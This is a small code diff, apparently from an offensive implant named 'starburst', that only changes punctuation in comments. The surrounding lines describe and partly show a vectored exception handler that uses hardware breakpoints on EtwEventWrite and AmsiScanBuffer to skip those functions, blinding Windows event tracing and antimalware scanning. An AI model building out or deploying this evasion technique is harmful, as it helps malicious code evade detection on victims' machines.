@@ -11,7 +11,7 @@ namespace starburst {
 // Catches hardware breakpoint exceptions (EXCEPTION_SINGLE_STEP) fired by
 // debug registers DR0 (EtwEventWrite) and DR1 (AmsiScanBuffer).
 // Returns STATUS_SUCCESS / S_OK and skips the hooked function entirely.
-// No globals needed — hook addresses live in the debug registers themselves.
+// No globals needed - hook addresses live in the debug registers themselves.
 
 static auto WINAPI declfn veh_hw_bp_handler(
     EXCEPTION_POINTERS* ep ) -> LONG
@@ -47,7 +47,7 @@ static auto declfn ensure_veh_installed( instance& inst ) -> bool {
     if ( inst.evasion.amsi_veh )
         return true;
 #else
-    // No amsi_veh field available — track via etw_patched as a proxy
+    // No amsi_veh field available - track via etw_patched as a proxy
     // (VEH is idempotent; worst case we register twice which is harmless)
 #endif
 
